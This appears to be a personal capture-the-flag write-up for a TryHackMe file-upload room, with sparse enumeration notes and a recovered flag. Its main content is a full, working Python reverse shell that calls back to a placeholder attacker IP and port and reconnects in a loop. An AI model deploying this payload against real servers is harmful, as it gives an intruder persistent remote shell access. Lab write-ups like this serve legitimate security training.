---
cssclasses:
  - jbm-note
Date: 2026-05-20
tags:
  - THMChallenge
---
# File upload Challenge

| **Target**            | *Try hack me machine(room: lafb2026e4)* |
| --------------------- | --------------------------------------- |
| Date                  | 20/5/2026                               |
| Main attack type      | File upload vulnerability               |
| Secondary attack type | Remote code execution (RCE)             |
| Tools:                | Burpsuite, NMAP, FUFF                   |
| Criticality:          | CVE **9.0**-**10.0**                    |

---
# **RESULTS**
---
## Flags found
- *THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}*

---
# Preparation
---
## Making the Python payload
`shell.py` - Main test:
```Python
import socket
import subprocess
import os
import time
import pty
# Configuration variables
LHOST = "YOUR_TRYHACKME_VPN_IP"
LPORT = 4444
RECONNECT_DELAY = 10  # Seconds to wait before retrying connection

while True:
    try:
        # Initialize socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((LHOST, LPORT))
        
        # Duplicate standard file descriptors 
        # for interactive shell access
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Spawn the interactive terminal shell
        pty.spawn("sh")
        
    except (socket.error, Exception):
        # Catch network drops, connection failures,
        # or terminal exit signals
        pass
    finally:
        # Ensure the socket closes cleanly before
        # trying a fresh connection
        try:
            s.close()
        except:
            pass
        
        # Pause to prevent high CPU utilization
        # during connection loops
        time.sleep(RECONNECT_DELAY)
```

---
# Initial investigation/enumeration
---
## **Enumeration**
The site is running on python3.
### FUFF results
No particularly interesting results.
## NMAP results
No interesting results.
## **Vulnerability scanning**
### Python
Python webshell.

---
# Exploiting and  Investigation
---

## File upload -> Web Shell
After uploading the payload without any restrictions, The flag is easily found in `flag.txt`.